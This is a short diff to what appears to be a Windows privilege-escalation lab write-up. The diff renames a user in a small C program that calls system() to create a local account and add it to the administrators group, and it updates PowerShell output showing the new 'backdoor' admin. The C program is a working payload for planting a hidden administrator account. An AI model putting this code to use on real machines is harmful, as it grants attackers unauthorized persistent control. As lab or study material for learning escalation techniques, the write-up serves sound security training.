@@ -74,8 +74,8 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
+  i = system ("net user backdoor password123! /add");
+  i = system ("net localgroup administrators backdoor /add");
   
   return 0;
 }
@@ -147,5 +147,6 @@ PS C:\Users\dave> shutdown /r /t 0
 PS> Get-LocalGroupMember administrators
 
 User        CLIENTWK220\Admin            Local
-User        CLIENTWK220\evil_admin       Local
+User        CLIENTWK220\backdoor         Local
 ```
+
